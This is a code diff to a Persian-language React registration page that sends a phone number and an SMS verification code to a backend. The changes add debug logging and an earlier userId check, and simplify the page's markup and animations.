@@ -12,6 +12,8 @@ export default function Register() {
   };
 
   const sendPhone = async () => {
+    console.log("SEND PHONE CLICKED");
+
     if (phone.length !== 11 || !phone.startsWith("09")) {
       alert("شماره معتبر نیست");
       return;
@@ -33,7 +35,11 @@ export default function Register() {
         }
       );
 
+      console.log("STATUS:", res.status);
+
       const data = await res.json();
+
+      console.log("RESPONSE:", data);
 
       localStorage.setItem("userId", data.id);
 
@@ -41,13 +47,20 @@ export default function Register() {
       setStep(2);
 
     } catch (err) {
-      console.log(err);
+      console.error(err);
       setLoading(false);
       alert("خطا در اتصال به سرور");
     }
   };
 
   const verifyCode = async () => {
+    const userId = localStorage.getItem("userId");
+
+    if (!userId) {
+      alert("شناسه کاربر پیدا نشد");
+      return;
+    }
+
     if (code.length < 4) {
       alert("کد معتبر نیست");
       return;
@@ -56,9 +69,7 @@ export default function Register() {
     setLoading(true);
 
     try {
-      const userId = localStorage.getItem("userId");
-
-      await fetch(
+      const res = await fetch(
         `https://khafan-site.onrender.com/code/${userId}`,
         {
           method: "PUT",
@@ -71,11 +82,17 @@ export default function Register() {
         }
       );
 
+      console.log("CODE STATUS:", res.status);
+
+      const data = await res.json();
+
+      console.log("CODE RESPONSE:", data);
+
       setLoading(false);
       setStep(3);
 
     } catch (err) {
-      console.log(err);
+      console.error(err);
       setLoading(false);
       alert("خطا در ذخیره کد");
     }
@@ -83,26 +100,16 @@ export default function Register() {
 
   return (
     <div className="container">
-
       <AnimatePresence mode="wait">
 
         {step === 0 && (
           <motion.div
             key="start"
             className="card"
-            initial={{ opacity: 0, scale: 0.7 }}
+            initial={{ opacity: 0, scale: 0.8 }}
             animate={{ opacity: 1, scale: 1 }}
-            exit={{ opacity: 0 }}
           >
-            <h1 className="title">
-              ورود به بازی
-            </h1>
-
-            <img
-              src="https://cdn.donmai.us/original/08/20/0820bb9acc44ccd754daa0abc6247ffc.png"
-              className="logo"
-              alt=""
-            />
+            <h1>ورود به بازی</h1>
 
             <button
               className="btn"
@@ -124,9 +131,9 @@ export default function Register() {
 
             <input
               type="tel"
+              placeholder="09928532443"
               value={phone}
               maxLength={11}
-              placeholder="09928532443"
               onChange={(e) =>
                 setPhone(
                   onlyNumbers(
@@ -153,13 +160,7 @@ export default function Register() {
             initial={{ x: -200, opacity: 0 }}
             animate={{ x: 0, opacity: 1 }}
           >
-            <h2>
-              کد تایید را وارد کنید
-            </h2>
-
-            <p className="smsText">
-              کد از طریق پیامک برای شما ارسال شد
-            </p>
+            <h2>کد تایید را وارد کنید</h2>
 
             <input
               value={code}
@@ -188,24 +189,11 @@ export default function Register() {
           <motion.div
             key="done"
             className="card"
-            initial={{
-              scale: 1.4,
-              opacity: 0,
-            }}
-            animate={{
-              scale: 1,
-              opacity: 1,
-            }}
+            initial={{ scale: 1.2, opacity: 0 }}
+            animate={{ scale: 1, opacity: 1 }}
           >
-            <h2 className="success">
-              ثبت نام شما انجام شد
-            </h2>
-
-            <div className="typing">
-              در حال ورود به بازی...
-            </div>
-
-            <div className="loader"></div>
+            <h2>ثبت نام شما انجام شد</h2>
+            <p>در حال ورود به بازی...</p>
           </motion.div>
         )}
 
@@ -213,16 +201,9 @@ export default function Register() {
 
       {loading && (
         <div className="overlay">
-          <div>
-            <div className="loader"></div>
-
-            <div className="loadingText">
-              در حال پردازش...
-            </div>
-          </div>
+          <div className="loader"></div>
         </div>
       )}
-
     </div>
   );
 }
